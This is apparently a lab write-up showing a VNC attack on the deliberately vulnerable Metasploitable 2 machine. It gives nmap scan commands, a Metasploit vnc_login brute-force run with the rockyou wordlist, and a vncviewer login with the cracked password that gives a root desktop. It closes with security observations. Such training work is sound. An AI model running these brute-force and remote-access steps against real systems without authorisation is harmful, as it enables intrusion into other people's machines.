# 🖥️ VNC Weak Password – Root GUI Access (Port 5900)

> This section documents the process of exploiting a weak VNC service running on Metasploitable 2 to gain root GUI access.

---

## 🔍 Service Discovery

```bash
nmap -p 5900 -sV 192.168.182.128
```

📌 Output:
- VNC (protocol 3.3)

VNC Protocol 3.3 is known to have weak authentication and no traffic encryption.

---

## 🧪 Step 1: VNC Script Scan

```bash
nmap -p 5900 --script vnc-info 192.168.182.128
```

📌 Output:
- Protocol version: 3.3
- Security types: VNC Authentication (2)

---

## 🔓 Step 2: Brute-force Attack with Metasploit

```bash
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 192.168.182.128
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

📌 Result:
- Login Successful:
  - Username: (blank)
  - Password: `password`

---

## 💻 Step 3: GUI Access with VNC Viewer

```bash
vncviewer 192.168.182.128
```

- Entered password: `password`
- ✅ Successfully accessed the desktop GUI
- Observed that session was already running as **root**

---

## ⚠️ Security Observations

- VNC 3.3 does **not** encrypt traffic
- Authentication is weak (DES-based)
- No account-level access control
- Password was common (`password`)
